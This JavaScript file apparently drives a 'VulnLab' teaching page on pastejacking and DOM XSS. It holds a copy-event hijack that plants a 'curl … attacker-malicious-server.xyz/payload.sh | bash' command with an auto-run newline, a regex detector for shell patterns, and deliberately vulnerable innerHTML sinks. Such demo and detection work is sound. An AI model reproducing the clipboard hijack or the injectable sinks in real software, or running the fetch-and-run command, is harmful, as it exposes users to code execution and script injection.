// VulnLab - Main Interactive Scripts

document.addEventListener('DOMContentLoaded', () => {
    initPastejackDemo();
    initClipboardInspector();
    initPayloadBadges();
    initDomXssDemo();
});

// ==============================================================
// 1. PASTEJACKING & CLIPBOARD HIJACKING DEMOS
// ==============================================================
function initPastejackDemo() {
    // A. JavaScript Copy Event Interception
    const jsTarget = document.getElementById('js-hijack-container');
    if (jsTarget) {
        jsTarget.addEventListener('copy', (e) => {
            // Stop standard copy behavior
            e.preventDefault();

            // Malicious payload with auto-executing newline
            const maliciousPayload = 'echo "ALERT: PASTEJACKING ATTACK TRIGGERED!" && calc.exe\n';

            // Set the clipboard data directly
            if (e.clipboardData) {
                e.clipboardData.setData('text/plain', maliciousPayload);
            } else if (window.clipboardData) {
                window.clipboardData.setData('Text', maliciousPayload);
            }

            showNotification('⚠️ Clipboard hijacked! Malicious payload injected with newline.', 'warning');
        });
    }

    // Copy Button with JS Hijack
    const btnJsCopy = document.getElementById('btn-copy-js-hijack');
    if (btnJsCopy) {
        btnJsCopy.addEventListener('click', async () => {
            const maliciousPayload = 'curl -sSL http://attacker-malicious-server.xyz/payload.sh | bash\n';
            try {
                await navigator.clipboard.writeText(maliciousPayload);
                showNotification('⚠️ Copied with JS navigator.clipboard hijack! (Payload: curl | bash\\n)', 'warning');
            } catch (err) {
                // Fallback for older browsers / permissions
                const textArea = document.createElement("textarea");
                textArea.value = maliciousPayload;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                showNotification('⚠️ Copied via execCommand hijack!', 'warning');
            }
        });
    }

    // Normal Copy Button (for comparison)
    const btnNormalCopy = document.getElementById('btn-copy-normal');
    if (btnNormalCopy) {
        btnNormalCopy.addEventListener('click', async () => {
            const normalCmd = 'git clone https://github.com/torvalds/linux.git';
            await navigator.clipboard.writeText(normalCmd);
            showNotification('✅ Normal copy: Legitimate command copied.', 'success');
        });
    }
}

// ==============================================================
// 2. SAFE CLIPBOARD INSPECTOR & ANALYZER
// ==============================================================
function initClipboardInspector() {
    const pasteBox = document.getElementById('safe-paste-box');
    const outputDetails = document.getElementById('paste-analysis-results');
    const rawOutput = document.getElementById('paste-raw-output');
    const hexOutput = document.getElementById('paste-hex-output');
    const alertBox = document.getElementById('paste-security-alert');

    if (!pasteBox) return;

    pasteBox.addEventListener('input', () => {
        analyzePastedText(pasteBox.value);
    });

    pasteBox.addEventListener('paste', (e) => {
        // Let the paste happen, then inspect immediately
        setTimeout(() => {
            analyzePastedText(pasteBox.value);
        }, 50);
    });

    const btnClear = document.getElementById('btn-clear-inspector');
    if (btnClear) {
        btnClear.addEventListener('click', () => {
            pasteBox.value = '';
            if (outputDetails) outputDetails.classList.add('hidden');
            if (alertBox) alertBox.classList.add('hidden');
        });
    }

    function analyzePastedText(text) {
        if (!text) {
            if (outputDetails) outputDetails.classList.add('hidden');
            if (alertBox) alertBox.classList.add('hidden');
            return;
        }

        outputDetails.classList.remove('hidden');

        // Display Raw & Escaped
        if (rawOutput) rawOutput.textContent = text;

        // Display Hex / Escape Sequences
        if (hexOutput) {
            let hexStr = '';
            let escapedStr = '';
            for (let i = 0; i < text.length; i++) {
                const char = text[i];
                const code = char.charCodeAt(0);
                if (char === '\n') escapedStr += '\\n (newline)\n';
                else if (char === '\r') escapedStr += '\\r (carriage return) ';
                else if (char === '\t') escapedStr += '\\t (tab) ';
                else if (code < 32 || code > 126) escapedStr += `\\u${code.toString(16).padStart(4, '0')} `;
                else escapedStr += char;

                hexStr += code.toString(16).toUpperCase().padStart(2, '0') + ' ';
            }
            hexOutput.textContent = `Escaped Representation:\n${escapedStr}\n\nHex Dump:\n${hexStr}`;
        }

        // Security Analysis
        const hasTrailingNewline = text.endsWith('\n') || text.endsWith('\r\n') || text.includes('\n');
        const dangerousPatterns = [
            /calc\.exe/i,
            /powershell/i,
            /cmd\.exe/i,
            /curl.*\|\s*(ba)?sh/i,
            /wget.*\|\s*(ba)?sh/i,
            /rm\s+-rf/i,
            /del\s+\/f/i,
            /format\s+[a-z]:/i,
            /whoami/i
        ];

        let matchedThreats = [];
        if (hasTrailingNewline) {
            matchedThreats.push("🚨 Auto-Execution Newline: Trailing '\\n' detected! If pasted into a terminal, this executes immediately without asking for user confirmation!");
        }

        for (const pattern of dangerousPatterns) {
            if (pattern.test(text)) {
                matchedThreats.push(`⚠️ Suspicious Command / Shell Pattern Detected: Matches '${pattern.toString()}'`);
            }
        }

        if (alertBox) {
            if (matchedThreats.length > 0) {
                alertBox.className = 'p-4 rounded-lg bg-red-950/80 border border-red-500 text-red-200';
                alertBox.innerHTML = `
                    <div class="font-bold flex items-center gap-2 text-red-400">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                        CRITICAL CLIPBOARD HIJACK DETECTED!
                    </div>
                    <ul class="list-disc pl-5 mt-2 space-y-1 text-sm">
                        ${matchedThreats.map(t => `<li>${escapeHtml(t)}</li>`).join('')}
                    </ul>
                `;
                alertBox.classList.remove('hidden');
            } else {
                alertBox.className = 'p-4 rounded-lg bg-emerald-950/80 border border-emerald-500 text-emerald-200';
                alertBox.innerHTML = `
                    <div class="font-bold flex items-center gap-2 text-emerald-400">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
                        Clean Content
                    </div>
                    <p class="text-sm mt-1">No automatic newline execution or known malicious shell signatures detected.</p>
                `;
                alertBox.classList.remove('hidden');
            }
        }
    }
}

// ==============================================================
// 3. CHEAT SHEET & QUICK COPY PAYLOADS
// ==============================================================
function initPayloadBadges() {
    document.querySelectorAll('.copy-payload').forEach(el => {
        el.addEventListener('click', async () => {
            const payload = el.getAttribute('data-payload') || el.innerText.trim();
            await navigator.clipboard.writeText(payload);
            showNotification(`Copied to clipboard: "${payload.substring(0, 35)}..."`, 'info');
        });
    });
}

// ==============================================================
// 4. DOM-BASED XSS DEMO
// ==============================================================
function initDomXssDemo() {
    const domTarget = document.getElementById('dom-xss-target');
    const domInput = document.getElementById('dom-xss-input');
    const domBtn = document.getElementById('btn-run-dom-xss');

    if (!domTarget || !domInput || !domBtn) return;

    // Check if URL contains hash payload e.g. #name=<script>
    function checkHash() {
        const hash = window.location.hash;
        if (hash && hash.startsWith('#search=')) {
            const rawVal = decodeURIComponent(hash.substring(8));
            // VULNERABLE: Direct innerHTML assignment from URL hash!
            domTarget.innerHTML = `Results for search query: <b>${rawVal}</b>`;
        }
    }

    domBtn.addEventListener('click', () => {
        const val = domInput.value;
        // VULNERABLE: Direct innerHTML assignment without DOMPurify or textContent!
        domTarget.innerHTML = `Live preview: ${val}`;
    });

    checkHash();
    window.addEventListener('hashchange', checkHash);
}

// ==============================================================
// 5. TOAST NOTIFICATION UTILITY
// ==============================================================
function showNotification(message, type = 'info') {
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        container.className = 'fixed bottom-4 right-4 z-50 flex flex-col gap-2 pointer-events-none';
        document.body.appendChild(container);
    }

    const toast = document.createElement('div');
    const colorClasses = {
        success: 'bg-emerald-900/90 border-emerald-500 text-emerald-100',
        warning: 'bg-amber-900/90 border-amber-500 text-amber-100',
        error: 'bg-rose-900/90 border-rose-500 text-rose-100',
        info: 'bg-cyan-900/90 border-cyan-500 text-cyan-100'
    }[type] || 'bg-gray-800 border-gray-600 text-gray-100';

    toast.className = `px-4 py-3 rounded-lg border shadow-xl text-sm font-medium transition-all duration-300 transform translate-y-2 opacity-0 pointer-events-auto flex items-center gap-2 ${colorClasses}`;
    toast.textContent = message;

    container.appendChild(toast);

    // Animate in
    requestAnimationFrame(() => {
        toast.classList.remove('translate-y-2', 'opacity-0');
    });

    // Auto dismiss
    setTimeout(() => {
        toast.classList.add('opacity-0', 'translate-y-2');
        setTimeout(() => toast.remove(), 300);
    }, 4000);
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
